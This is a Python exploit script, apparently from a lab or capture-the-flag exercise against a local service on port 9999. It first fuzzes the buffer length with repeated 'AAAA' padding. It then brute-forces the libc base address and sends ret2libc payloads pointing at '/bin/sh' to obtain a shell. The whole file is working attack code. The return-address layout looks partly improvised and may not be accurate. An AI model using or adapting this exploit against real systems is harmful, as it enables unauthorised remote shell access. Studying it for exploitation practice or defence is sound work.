import sys
import struct
import time
import socket

N = 10
HOST = "localhost"
PORT = 9999

# Código inicial comentado, igual que antes
while True:
  payload = b'AAAA' * N
  # print(payload.decode())
  # Create socket connection
  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  try:
    sock.connect((HOST, PORT))
    # Send payload
    sock.sendall(payload)
    # Receive response
    response = sock.recv(1024)
    if not response:
      print("No response from server, breaking...")
      break
    # print(f"Response: {response}")
    # Wait before next attempt
    time.sleep(1)
  except socket.error as e:
    print(f"Socket error: {e}")
    break
  finally:
    sock.close()
  N += 1
print(f"Número que falló: {N}")

N -= 1  # ajustar como en bash

BASE = 0xf7c00220
payload = b'AAAA' * N  # bytes
intento = 0
while BASE < 0xf7ef0000:
  # Empaquetar dirección BASE en little endian
  hex_packed = struct.pack('<I', BASE)
  # print(f"Direccion de memoria generada: 0x{BASE:08X}")

  binsh_addr = BASE + 0x172721  # offset de "/bin/sh" en libc
  junk_addr = struct.pack('<I', 0xDEADEFFF) # dirección de la función exit() o similar
  binsh_packed = struct.pack('<I', binsh_addr)

  # Construir payload final: payload + base + binsh
  final_payload = payload + hex_packed + junk_addr + binsh_packed

  # Mostrar payload en formato hex para debug (opcional)
  #sys.stdout.buffer.write(final_payload)

  # Enviar binario directo a stdout (como un pipe a nc)
  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  try:
    sock.connect((HOST, PORT))
    # Send payload
    sock.sendall(final_payload)
    # Receive response
    response = sock.recv(2048)
    if response:
      print(f"Response: {response}")
    # Wait before next attempt
    time.sleep(0.1)
  except socket.error as e:
    print(f"Socket error: {e}")
  finally:
    sock.close()
  print(f"Intento: {intento} - BASE: 0x{BASE:08X} - binsh_addr: 0x{binsh_addr:08X} - junk_addr: 0x{struct.unpack('<I', junk_addr)[0]:08X} - binsh_packed: 0x{struct.unpack('<I', binsh_packed)[0]:08X}")
  intento += 1
  BASE += 0x1000

print(f"Stopped at BASE: 0x{BASE:08X}")
